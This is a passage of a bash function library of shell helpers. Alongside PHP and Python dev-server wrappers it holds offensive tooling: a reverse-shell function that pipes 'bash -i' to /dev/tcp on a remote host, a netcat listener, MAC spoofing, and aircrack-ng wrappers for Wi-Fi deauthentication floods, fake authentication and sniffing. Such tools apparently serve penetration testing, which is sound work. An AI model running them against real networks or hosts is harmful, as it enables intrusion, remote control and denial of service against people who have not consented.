    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'wifi-monitor-mode\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Set wlan adapter to monitor mode\n'
                    _usage 2 14
                    _echo_success 'note:' 2 14; _echo_primary "available wifi adapters: ${wifi_adapters}\n"
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check iwconfig installation
    #--------------------------------------------------

    if [ -z "$(command -v 'iwconfig')" ]; then
        _echo_danger 'error: iwconfig not installed, try "sudo apt-get install -y iwconfig"\n'
        return 1
    fi

    #--------------------------------------------------
    # Check ifconfig installation
    #--------------------------------------------------

    if [ -z "$(command -v 'ifconfig')" ]; then
        _echo_danger 'error: ifconfig not installed, try "sudo apt-get install -y net-tools"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    if [ -n "${arguments[${LBOUND}]}" ]; then
        wifi_adapter="${arguments[${LBOUND}]}"
    fi

    #--------------------------------------------------

    _echo_info "sudo ifconfig \"${wifi_adapter}\" down\n"
    sudo ifconfig "${wifi_adapter}" down

    # optional check kill with airmon-ng if installed
    if [ -n "$(command -v 'airmon-ng')" ]; then
        _echo_info 'sudo airmon-ng check kill\n'
        sudo airmon-ng check kill
    fi

    _echo_info "sudo iwconfig \"${wifi_adapter}\" mode monitor\n"
    sudo iwconfig "${wifi_adapter}" mode monitor

    _echo_info "sudo ifconfig \"${wifi_adapter}\" up\n"
    sudo ifconfig "${wifi_adapter}" up

    _echo_info "sudo iwconfig \"${wifi_adapter}\"\n"
    sudo iwconfig "${wifi_adapter}"
}

## Discover available wireless networks
function wifi-radar() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'wifi-radar (adapter) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local wifi_adapter
    local wifi_adapters

    #--------------------------------------------------

    # showing wireless adapters only
    if [ -n "$(command -v 'arp')" ]; then
        # NOTE: arp command prints connected devices only
        # set wireless as default adapter
        wifi_adapter="$(arp -a | cut -d' ' -f7 | grep -E '^w' | head -n1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(arp -a | cut -d' ' -f7 | grep -E '^w')")"

    elif [ -n "$(command -v 'ip')" ]; then
        # set wireless as default adapter
        wifi_adapter="$(ip token | cut -d' ' -f4 | grep -E '^w' | head -n1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(ip token | cut -d' ' -f4 | grep -E '^w')")"

    else
        # set wireless as default adapter
        wifi_adapter="$(ifconfig | grep -E '^w' | head -n1 | cut -d: -f1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(ifconfig | grep -E '^w\w+:' | cut -d: -f1)")"
    fi

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'wifi-radar\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Discover available wireless networks\n'
                    _usage 2 14
                    _echo_success 'note:' 2 14; _echo_primary "available wifi adapters: ${wifi_adapters}\n"
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check ifconfig installation
    #--------------------------------------------------

    if [ -z "$(command -v 'ifconfig')" ]; then
        _echo_danger 'error: ifconfig not installed, try "sudo apt-get install -y net-tools"\n'
        return 1
    fi

    #--------------------------------------------------
    # Check airodump-ng installation
    #--------------------------------------------------

    if [ -z "$(command -v 'airodump-ng')" ]; then
        _echo_danger 'error: airodump-ng not installed, try "sudo apt-get install -y aircrack-ng"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    if [ -n "${arguments[${LBOUND}]}" ]; then
        wifi_adapter="${arguments[${LBOUND}]}"
    fi

    #--------------------------------------------------

    _echo_info "sudo airodump-ng --band abg \"${wifi_adapter}\"\n"
    sudo airodump-ng --band abg "${wifi_adapter}"
}

## Start php built-in server
function php-server() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'php-server (docroot) -i (ip) -p (port) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local docroot
    local ip=127.0.0.1
    local port=8080

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :i:p:h option; do
            case "${option}" in
                i) ip="${OPTARG}";;
                p) port="${OPTARG}";;
                h) _echo_warning 'php-server\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Start php builtin server\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check php installation
    #--------------------------------------------------

    if [ ! -x "$(command -v php)" ]; then
        _echo_danger 'error: php required, enter: "sudo apt-get install -y php" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    docroot=${arguments[${LBOUND}]}

    #--------------------------------------------------

    # guess correct docroot "./web" exists in current directory
    if [ -z "${docroot}" ] && [ -d ./web ]; then
        # symfony 2/3 docroot
        docroot=./web
    # guess correct docroot "./public" exists in current directory
    elif [ -z "${docroot}" ] && [ -d ./public ]; then
        # symfony 4/5 docroot
        docroot=./public
    else
        docroot=.
    fi

    # check ip valid
    if [[ ! "${ip}" =~ ^([0-9]{0,3}\.){3}[0-9]{0,3}$ ]]; then
        _echo_danger 'error: ip should match ipv4 format\n'
        _usage 2 8
        return 1
    fi

    # port should be a positive integer
    if [[ ! "${port}" =~ ^[0-9]+$ ]]; then
        _echo_danger 'error: port should be a positive integer\n'
        _echo_success 0 8 'usage:'; _echo_primary 'netcat-reverse-shell [ip] -p [port] -h (help)\n'
        return 1
    fi

    _echo_info "php -d memory-limit=-1 -S \"${ip}:${port}\" -t \"${docroot}\"\n"
    php -d memory-limit=-1 -S "${ip}:${port}" -t "${docroot}"
}

## Set default php version
function set-php-version() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'set-php [version] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local is_valid=false
    local valid_versions=(3.0 4.0 4.1 4.2 4.3 4.4 5.0 5.1 5.2 5.3 5.4 5.5 5.6 7.1 7.2 7.3 7.4 8.0 8.1 8.2)
    local version

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'set-php-version\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Set default php version\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check php installation
    #--------------------------------------------------

    if [ ! -x "$(command -v php)" ]; then
        _echo_danger 'error: php required, enter: "sudo apt-get install -y php" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    version=${arguments[${LBOUND}]}

    #--------------------------------------------------

    # check valid version
    for VALID_version in "${valid_versions[@]}"; do
        if [ "${version}" = "${VALID_version}" ]; then
            is_valid=true
        fi
    done

    if [ "${is_valid}" = false ]; then
        _echo_danger 'error: Invalid PHP version\n'
        _usage 2 8
        return 1
    fi

    _echo_info "sudo update-alternatives --set php \"/usr/bin/php${version}\"\n"
    sudo update-alternatives --set php "/usr/bin/php${version}"
}

#--------------------------------------------------
# Python aliases
#--------------------------------------------------

alias py='python3' ## Execute python3 command
alias pytests='_echo_info "python3 -m unittest -v\n" && python3 -m unittest -v' ## Perform python unittest
alias py-install='pip3 install -r requirements.txt' ## Install requirements.txt with pip3

## Start python built-in server
function py-server() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'py-server (docroot) -i (ip) -p (port) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local docroot
    local ip=127.0.0.1
    local port=8080

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :i:p:h option; do
            case "${option}" in
                i) ip="${OPTARG}";;
                p) port="${OPTARG}";;
                h) _echo_warning 'py-server\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Start python builtin server\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check python installation
    #--------------------------------------------------

    if [ ! -x "$(command -v python)" ] && [ ! -x "$(command -v python3)" ]; then
        _echo_danger 'error: python required, enter: "sudo apt-get install -y python" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    docroot=${arguments[${LBOUND}]}
    if [ -z "${docroot}" ]; then
        docroot=.
    fi

    # check ip valid
    if [[ ! "${ip}" =~ ^([0-9]{0,3}\.){3}[0-9]{0,3}$ ]]; then
        _echo_danger 'error: ip should match ipv4 format\n'
        _echo_success 0 8 'usage:'; _echo_primary 'php-server (docroot) -i (ip) -p (port)\n'
        return 1
    fi

    # port should be a positive integer
    if [[ ! "${port}" =~ ^[0-9]+$ ]]; then
        _echo_danger 'error: port should be a positive integer\n'
        _echo_success 0 8 'usage:'; _echo_primary 'netcat-reverse-shell [ip] -p [port] -h (help)\n'
        return 1
    fi

    # run python2 SimpleHTTPServer if python3 not installed
    if [ ! -x "$(command -v python3)" ]; then
        _echo_info "python2 -m SimpleHTTPServer \"${port}\"\n"
        python2 -m SimpleHTTPServer "${port}"
    else
        _echo_info "python3 -m http.server --bind \"${ip}\" --directory \"${docroot}\" \"${port}\"\n"
        python3 -m http.server --bind "${ip}" --directory "${docroot}" "${port}"
    fi
}

## Spoof network adapter mac address (generates random mac if not provided)
function change-mac-address() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'change-mac-address (adapter) -s [spoof_mac] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local adapter
    local adapters
    local spoof

    #--------------------------------------------------

    if [ -n "$(command -v 'arp')" ]; then
        # list all available connected adapters
        adapters="$(arp -a | cut -d' ' -f7 | uniq | tr '\n' ' ')"

    elif [ -n "$(command -v 'ip')" ]; then
        # list all available adapters
        adapters="$(ip token | cut -d' ' -f4 | sort | tr '\n' ' ')"

    else
        # list all available adapters
        # NOTE: `-o` output only the matching parts
        #     `^\w*` match first word of each line starting with a word character
        adapters="$(ifconfig | grep -o '^\w*' | sort | tr '\n' ' ')"
    fi

    if [ -n "$(command -v 'iwconfig')" ]; then
        # list all available wireless adapters
        # NOTE: `-o` output only the matching parts
        #     `^\w*` match first word of each line starting with a word character
        adapters="$(iwconfig 2>/dev/null | grep -o '^\w*' | sort | tr '\n' ' ')"
    fi

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :s:h option; do
            case "${option}" in
                s) spoof="${OPTARG}";;
                h) _echo_warning 'change-mac-address\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Spoof network adapter mac address (generates random mac if not provided)\n'
                    _usage 2 14
                    _echo_success 'note:' 2 14; _echo_warning "available adapters: ${adapters}\n"
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check ifconfig installation
    #--------------------------------------------------

    if [ -z "$(command -v 'ifconfig')" ]; then
        _echo_danger 'error: ifconfig not installed, try "sudo apt-get install -y net-tools"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    if [ -n "${arguments[${LBOUND}]}" ]; then
        adapter="${arguments[${LBOUND}]}"
    fi

    #--------------------------------------------------

    if [ -z "${spoof}" ]; then
        # sed 's/../&:/g;s/:$//': Inserts colons after every two characters and removes the trailing colon.
        spoof="$(tr -dc 'A-F0-9' < /dev/urandom | fold -w '12' | head -n 1 | sed 's/../&:/g;s/:$//')"
    fi

    #--------------------------------------------------

    # check mac adress format
    if [[ ! "${spoof}" =~ ^([a-zA-Z0-9]{2}:){5}[a-zA-Z0-9]{2}$ ]]; then
        _echo_danger "error: invalid mac address \"${spoof}\"\n"
        _usage 2 8
        _echo_success 2 8 'note:'; _echo_warning "available adapters: ${adapters}\n"
        return 1
    fi

    #--------------------------------------------------
    # Iteractive pick
    #--------------------------------------------------

    if [ -z "${adapter}" ]; then
        PS3=$(_echo_success 'Please select adapter : ')
        select adapter in $(list-adapters); do
            # validate selection
            for ITEM in $(list-adapters); do
                # find selected adapter
                if [[ "${ITEM}" == "${adapter}" ]]; then
                    # break two encapsulation levels
                    break 2;
                fi
            done
        done
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    _echo_info "sudo ifconfig \"${adapter}\" down\n"
    sudo ifconfig "${adapter}" down

    _echo_info "sudo ifconfig \"${adapter}\" hw ether \"${spoof}\"\n"
    sudo ifconfig "${adapter}" hw ether "${spoof}"

    _echo_info "sudo ifconfig \"${adapter}\" up\n"
    sudo ifconfig "${adapter}" up

    _echo_info "ifconfig \"${adapter}\"\n"
    ifconfig "${adapter}"
}

## Listen to reverse shell connection with netcat
function netcat-listen()  {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'netcat-listen (port) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local lport

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'netcat-listen\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Listen to reverse shell connection with netcat\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        lport=8080
    else
        lport="${arguments[${LBOUND}]}"
    fi

    # port should be a positive integer
    if [[ ! "${lport}" =~ ^[0-9]+$ ]]; then
        _echo_danger 'error: port should be a positive integer\n'
        _usage 2 8
        return 1
    fi

    _echo_info "nc -vv -l -p \"${lport}\"\n"
    nc -vv -l -p "${lport}"
}

## Create a reverse shell connection
function reverse-shell() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'netcat-reverse-shell [ip] -p [port] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local rhost
    local rport

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :p:h option; do
            case "${option}" in
                p) rport="${OPTARG}";;
                h) _echo_warning 'reverse-shell\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Create a reverse shell connection\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    rhost=${arguments[${LBOUND}]}

    #--------------------------------------------------

    if [ -z "${LPORT}" ]; then
        LPORT=8080
    fi

    # check ip valid, host should be an ipv4
    if [[ ! "${rhost}" =~ ^([0-9]{0,3}\.){3}[0-9]{0,3}$ ]]; then
        _echo_danger 'error: host should be an ipv4 address\n'
        _usage 2 8
        return 1
    fi

    # port should be a positive integer
    if [[ ! "${rport}" =~ ^[0-9]+$ ]]; then
        _echo_danger 'error: port should be a positive integer\n'
        _usage 2 8
        return 1
    fi

    _echo_info "bash -i >& \"/dev/tcp/${rhost}/${rport}\" 0>&1\n"
    bash -i >& "/dev/tcp/${rhost}/${rport}" 0>&1
}

## Disconnect client from wifi network
function wifi-deauth() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'wifi-deauth (adapter) -r [router_mac] -c [client_mac] -p [packet_count] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local client
    local packet_count=10000000
    local router
    local wifi_adapter
    local wifi_adapters

    #--------------------------------------------------

    # showing wireless adapters only
    if [ -n "$(command -v 'arp')" ]; then
        # NOTE: arp command prints connected devices only
        # set wireless as default adapter
        wifi_adapter="$(arp -a | cut -d' ' -f7 | grep -E '^w' | head -n1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(arp -a | cut -d' ' -f7 | grep -E '^w')")"

    elif [ -n "$(command -v 'ip')" ]; then
        # set wireless as default adapter
        wifi_adapter="$(ip token | cut -d' ' -f4 | grep -E '^w' | head -n1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(ip token | cut -d' ' -f4 | grep -E '^w')")"

    else
        # set wireless as default adapter
        wifi_adapter="$(ifconfig | grep -E '^w' | head -n1 | cut -d: -f1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(ifconfig | grep -E '^w\w+:' | cut -d: -f1)")"
    fi

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :c:p:r:h option; do
            case "${option}" in
                c) client="${OPTARG}";;
                p) packet_count="${OPTARG}";;
                r) router="${OPTARG}";;
                h) _echo_warning 'wifi-deauth\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Disconnect client from wifi network\n'
                    _usage 2 14
                    _echo_success 'note:' 2 14; _echo_warning "available adapters: ${wifi_adapters}\n"
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check ifconfig installation
    #--------------------------------------------------

    if [ -z "$(command -v 'ifconfig')" ]; then
        _echo_danger 'error: ifconfig not installed, try "sudo apt-get install -y net-tools"\n'
        return 1
    fi

    #--------------------------------------------------
    # Check aireplay-ng installation
    #--------------------------------------------------

    if [ -z "$(command -v 'aireplay-ng')" ]; then
        _echo_danger 'error: aireplay-ng not installed, try "sudo apt-get install -y aircrack-ng"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    if [ -z "${client}" ] || [ -z "${router}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    # check mac adress format valid
    if [[ ! "${router}" =~ ^([a-zA-Z0-9]{2}:){5}[a-zA-Z0-9]{2}$ ]]; then
        _echo_danger "error: wrong mac address format ${router}\n"
        _usage 2 8
        return 1
    fi

    # check mac adress format valid
    if [[ ! "${client}" =~ ^([a-zA-Z0-9]{2}:){5}[a-zA-Z0-9]{2}$ ]]; then
        _echo_danger "error: wrong mac address format ${client}\n"
        _usage 2 8
        return 1
    fi

    if [ -n "${arguments[${LBOUND}]}" ]; then
        wifi_adapter="${arguments[${LBOUND}]}"
    fi

    _echo_info "sudo aireplay-ng --deauth \"${packet_count}\" -a \"${router}\" -c \"${client}\" \"${wifi_adapter}\"\n"
    sudo aireplay-ng --deauth "${packet_count}" -a "${router}" -c "${client}" "${wifi_adapter}"
}

## Associates with target wifi network
function wifi-fakeauth() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'wifi-fakeauth (adapter) -r [router_mac] (-c client_mac) (-d delay) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local client
    local delay=0
    local mac_addresses
    local router
    local wifi_adapter
    local wifi_adapters

    #--------------------------------------------------

    # showing wireless adapters only
    if [ -n "$(command -v 'arp')" ]; then
        # NOTE: arp command prints connected devices only
        # set wireless as default adapter
        wifi_adapter="$(arp -a | cut -d' ' -f7 | grep -E '^w' | head -n1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(arp -a | cut -d' ' -f7 | grep -E '^w')")"

    elif [ -n "$(command -v 'ip')" ]; then
        # set wireless as default adapter
        wifi_adapter="$(ip token | cut -d' ' -f4 | grep -E '^w' | head -n1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(ip token | cut -d' ' -f4 | grep -E '^w')")"

    else
        # set wireless as default adapter
        wifi_adapter="$(ifconfig | grep -E '^w' | head -n1 | cut -d: -f1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(ifconfig | grep -E '^w\w+:' | cut -d: -f1)")"
    fi

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :c:d:r:h option; do
            case "${option}" in
                c) client="${OPTARG}";;
                d) delay="${OPTARG}";;
                r) router="${OPTARG}";;
                h) _echo_warning 'wifi-fakeauth\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Associates with target wifi network\n'
                    _status 14
                    _echo_success 'note:' 2 14; _echo_warning "available adapters: ${wifi_adapters}\n"
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check ifconfig installation
    #--------------------------------------------------

    if [ -z "$(command -v 'ifconfig')" ]; then
        _echo_danger 'error: ifconfig not installed, try "sudo apt-get install -y net-tools"\n'
        return 1
    fi

    #--------------------------------------------------
    # Check aireplay-ng installation
    #--------------------------------------------------

    if [ -z "$(command -v 'aireplay-ng')" ]; then
        _echo_danger 'error: aireplay-ng not installed, try "sudo apt-get install -y aircrack-ng"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    if [ -z "${client}" ]; then
        # get monitor mode adapters mac addresses with awk
        mac_addresses="$(ifconfig | awk '/^[a-zA-Z0-9]+:/{A=substr($1, 0, index($1, ":"))}/unspec ([0-9][0-9]-)+/{printf "%s\n", A substr($2, 0, 17)}')"
        client="$(echo "${mac_addresses}" | grep -E '^w' | head -n1 | cut -d: -f2 | tr - :)"
    fi

    if [ -z "${client}" ] || [ -z "${router}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    # check mac adress format valid
    if [[ ! "${router}" =~ ^([a-zA-Z0-9]{2}:){5}[a-zA-Z0-9]{2}$ ]]; then
        _echo_danger "error: wrong mac address format ${router}\n"
        _usage 2 8
        return 1
    fi

    # mac address of wireless adapter in monitor mode
    if [[ ! "${client}" =~ ^([a-zA-Z0-9]{2}:){5}[a-zA-Z0-9]{2}$ ]]; then
        _echo_danger "error: wrong mac address format ${client}\n"
        _usage 2 8
        return 1
    fi

    if [ -n "${arguments[${LBOUND}]}" ]; then
        wifi_adapter="${arguments[${LBOUND}]}"
    fi

    _echo_info "sudo aireplay-ng --fakeauth \"${delay}\" -a \"${router}\" -h \"${client}\" \"${wifi_adapter}\"\n"
    sudo aireplay-ng --fakeauth "${delay}" -a "${router}" -h "${client}" "${wifi_adapter}"
}

## Dump captured packets from target adapter
function wifi-sniff() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'wifi-sniff [target] [-c channel] (-a adapter) -n (no_write) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local channel
    local file
    local target
    local wifi_adapter
    local wifi_adapters
    local write=true

    #--------------------------------------------------

    # showing wireless adapters only
    if [ -n "$(command -v 'arp')" ]; then
        # NOTE: arp command prints connected devices only
        # set wireless as default adapter
        wifi_adapter="$(arp -a | cut -d' ' -f7 | grep -E '^w' | head -n1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(arp -a | cut -d' ' -f7 | grep -E '^w')")"

    elif [ -n "$(command -v 'ip')" ]; then
        # set wireless as default adapter
        wifi_adapter="$(ip token | cut -d' ' -f4 | grep -E '^w' | head -n1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(ip token | cut -d' ' -f4 | grep -E '^w')")"

    else
        # set wireless as default adapter
        wifi_adapter="$(ifconfig | grep -E '^w' | head -n1 | cut -d: -f1)"
        # list all available adapters
        wifi_adapters="$(printf "%s " "$(ifconfig | grep -E '^w\w+:' | cut -d: -f1)")"
    fi

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :c:nh option; do
            case "${option}" in
                c) channel="${OPTARG}";;
                n) write=false;;
                h) _echo_warning 'wifi-sniff\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Dump captured packets from target adapter\n'
                    _usage 2 14
                    _echo_success 'note:' 2 14; _echo_warning "available adapters: ${wifi_adapters}\n"
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check ifconfig installation
    #--------------------------------------------------

    if [ -z "$(command -v 'ifconfig')" ]; then
        _echo_danger 'error: ifconfig not installed, try "sudo apt-get install -y net-tools"\n'
        return 1
    fi

    #--------------------------------------------------
